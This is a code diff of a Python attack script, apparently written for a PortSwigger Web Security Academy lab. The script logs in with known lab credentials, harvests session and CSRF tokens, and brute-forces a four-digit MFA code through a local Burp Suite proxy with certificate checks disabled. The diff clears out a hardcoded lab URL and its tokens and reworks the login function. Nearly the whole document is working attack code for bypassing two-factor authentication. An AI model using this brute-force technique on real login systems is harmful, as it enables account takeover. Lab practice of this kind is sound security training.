@@ -9,13 +9,14 @@ from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Target Data
-url = "https://0a710019042f9afe87a74900008200f2.web-security-academy.net"
-session = "JfEYCjunhY16ZHgUQ2AP4NGuwACPTec3"
-csrf = 'X1A3krNuyiK69q47oYby4ADCMSHVGM1u'
+url = ""
 
 # Localhost Proxies (To intercept with Burp Suite)
 proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }
 
+# Golbals
+session = ""
+csrf = ""
 
 def get_session_csrf(response: requests.Response):
     global session, csrf
@@ -33,11 +34,18 @@ def get_session_csrf(response: requests.Response):
         
         del hidden_inputs[0]
 
-def login(path):
+def login():
+    global session
+
     cookies = { "session": session }
     playload = f"csrf={csrf}&username=carlos&password=montoya"
-    response = requests.post(url + path, data=playload, cookies=cookies, verify=False, proxies=proxies)
+    response = requests.post(url + '/login', data=playload, cookies=cookies, verify=False, proxies=proxies)
+    
     get_session_csrf(response)
+
+    # Get the session of the logged-in user
+    if len(response.history) > 0 and len(response.history[0].cookies) > 0:
+        session = response.history[0].cookies['session']
 
 def main():    
     mfa_code = '0000'
@@ -45,7 +53,7 @@ def main():
     # Go to login page
     response_login = requests.get(url + '/login', verify=False, proxies=proxies)
     get_session_csrf(response_login)
-    login('/login')
+    login()
 
     # Forcing security code
     print("\r(+) Forcing security code...")
@@ -58,7 +66,7 @@ def main():
 
 
         if last_response != None and 'Log in' in last_response.text: 
-            login('/login2')
+            login()
 
         cookies = { "session": session }
         playload = f"csrf={csrf}&mfa-code={mfa_code}"
